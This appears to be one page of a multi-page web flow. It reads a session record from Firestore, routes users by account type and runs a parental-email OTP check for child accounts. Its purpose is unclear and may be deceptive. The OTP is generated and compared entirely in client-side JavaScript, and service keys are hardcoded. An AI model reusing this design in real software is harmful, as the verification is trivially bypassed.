<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verific bation</title>
    
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // Initialize EmailJS with your Public Key
            emailjs.init("Yr9MutUoHOEONnFgn");
        })();
    </script>

    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #ffffff;
            color: #333;
        }

        .container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            display: none; /* Hidden by default, shown via JS */
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: normal;
        }

        p {
            color: #666;
            margin-bottom: 30px;
            font-size: 14px;
        }

        /* Email Input Styles */
        .email-input {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 20px;
        }

        /* OTP Input Styles */
        .otp-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
        }

        .otp-input {
            width: 45px;
            height: 55px;
            border: 1px solid #ccc;
            border-radius: 8px;
            text-align: center;
            font-size: 24px;
            background-color: #fcfcfc;
        }
        
        .otp-input:focus {
            outline: none;
            border-color: #888;
        }

        /* Button Styles */
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .btn-primary {
            background-color: #8c8881; /* Matches the color in your screenshot */
            color: white;
        }

        .btn-primary:hover {
            background-color: #75716a;
        }

        .btn:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        #loading-screen {
            display: block; /* Show loading initially */
        }
        
        .error-msg {
            color: red;
            font-size: 14px;
            margin-top: -15px;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>

    <!-- 1. Loading Screen -->
    <div id="loading-screen" class="container">
        <h2>Please wait...</h2>
        <p>Verifying account details.</p>
    </div>

    <!-- 2. Email Collection Screen (For Kids) -->
    <div id="email-screen" class="container">
        <h1>Parental Consent</h1>
        <p>Please enter a parental email address to continue.</p>
        <input type="email" id="parent-email" class="email-input" placeholder="parent@example.com" required>
        <div id="email-error" class="error-msg">Please enter a valid email.</div>
        <button id="send-otp-btn" class="btn btn-primary">Send OTP</button>
    </div>

    <!-- 3. OTP Verification Screen (For Kids) -->
    <div id="otp-screen" class="container">
        <!-- SVG Icon from your screenshot approximation -->
        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom:20px;">
            <circle cx="12" cy="12" r="10"></circle>
            <path d="M12 16v-4"></path>
            <path d="M12 8h.01"></path>
            <path d="M15 9l-6 6"></path>
        </svg>
        <h1>Check your email</h1>
        <p id="otp-subtitle">A temporary sign-in link has been sent to</p>
        
        <div class="otp-container">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
        </div>
        <div id="otp-error" class="error-msg">Invalid OTP. Please try again.</div>
        
        <button id="confirm-otp-btn" class="btn btn-primary">Confirm</button>
    </div>

    <!-- Firebase SDK Implementation (v9 Modular) -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
        import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";

        // Your Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // UI Elements
        const loadingScreen = document.getElementById('loading-screen');
        const emailScreen = document.getElementById('email-screen');
        const otpScreen = document.getElementById('otp-screen');
        
        // Variables
        let generatedOTP = "";
        let userEmail = "";
        
        // Get Session ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');

        if (!sessionId) {
            loadingScreen.innerHTML = "<h2>Error</h2><p>No session ID found in URL.</p>";
            throw new Error("No session ID");
        }

        // --- Main Logic Function ---
        async function checkUserType() {
            try {
                // Fetch document from ASPX Keys collection using session ID
                const docRef = doc(db, "ASPX Keys", sessionId);
                const docSnap = await getDoc(docRef);

                if (docSnap.exists()) {
                    const data = docSnap.data();
                    const userType = data.type; // Assumes a 'type' field exists in DB

                    if (userType === "personal") {
                        await updateDoc(docRef, { family: "no" });
                        redirectTo7();
                    } 
                    else if (userType === "busniess" || userType === "business") {
                        await updateDoc(docRef, { family: "workspace" });
                        redirectTo7();
                    } 
                    else if (userType === "kids") {
                        // Hide loading, show email collection screen
                        loadingScreen.style.display = "none";
                        emailScreen.style.display = "block";
                    } 
                    else {
                        loadingScreen.innerHTML = "<h2>Error</h2><p>Unknown account type.</p>";
                    }
                } else {
                    loadingScreen.innerHTML = "<h2>Error</h2><p>Session not found in database.</p>";
                }
            } catch (error) {
                console.error("Error fetching data:", error);
                loadingScreen.innerHTML = "<h2>Error</h2><p>Database connection failed.</p>";
            }
        }

        // Execute main logic on load
        checkUserType();

        // --- KIDS FLOW: Send OTP Logic ---
        document.getElementById('send-otp-btn').addEventListener('click', () => {
            const emailInput = document.getElementById('parent-email').value;
            const errorMsg = document.getElementById('email-error');
            const btn = document.getElementById('send-otp-btn');

            if (!emailInput || !emailInput.includes('@')) {
                errorMsg.style.display = "block";
                return;
            }
            errorMsg.style.display = "none";
            userEmail = emailInput;
            
            // Generate 6 digit OTP
            generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();

            btn.disabled = true;
            btn.innerText = "Sending...";

            // Send via EmailJS
            const templateParams = {
                to_email: userEmail,
                otp: generatedOTP
            };

            emailjs.send("service_63mnm5a", "template_qxz1wka", templateParams)
                .then(function(response) {
                    // Success: Switch to OTP screen
                    emailScreen.style.display = "none";
                    otpScreen.style.display = "block";
                    document.getElementById('otp-subtitle').innerText = `A temporary sign-in link has been sent to\n${userEmail}`;
                }, function(error) {
                    console.error('FAILED...', error);
                    errorMsg.innerText = "Failed to send email. Check API limit.";
                    errorMsg.style.display = "block";
                    btn.disabled = false;
                    btn.innerText = "Send OTP";
                });
        });

        // --- KIDS FLOW: Verify OTP Logic ---
        document.getElementById('confirm-otp-btn').addEventListener('click', async () => {
            const inputs = document.querySelectorAll('.otp-input');
            let enteredOTP = "";
            inputs.forEach(input => enteredOTP += input.value);
            
            const errorMsg = document.getElementById('otp-error');
            const btn = document.getElementById('confirm-otp-btn');

            if (enteredOTP === generatedOTP) {
                errorMsg.style.display = "none";
                btn.disabled = true;
                btn.innerText = "Verifying...";

                try {
                    // Update DB to commited
                    const docRef = doc(db, "ASPX Keys", sessionId);
                    await updateDoc(docRef, { family: "commited" });
                    redirectTo7();
                } catch (error) {
                    errorMsg.innerText = "Error updating database.";
                    errorMsg.style.display = "block";
                    btn.disabled = false;
                    btn.innerText = "Confirm";
                }
            } else {
                errorMsg.style.display = "block";
            }
        });

        // --- Helper: Redirect Function ---
        function redirectTo7() {
            window.location.href = `7.html?session=${sessionId}`;
        }

        // --- Helper: OTP Input Auto-Focus Logic ---
        const otpInputs = document.querySelectorAll('.otp-input');
        otpInputs.forEach((input, index) => {
            input.addEventListener('keyup', (e) => {
                if (e.key >= 0 && e.key <= 9) {
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                } else if (e.key === 'Backspace') {
                    if (index > 0 && input.value === "") {
                        otpInputs[index - 1].focus();
                    }
                }
            });
        });

    </script>
</body>
</html>
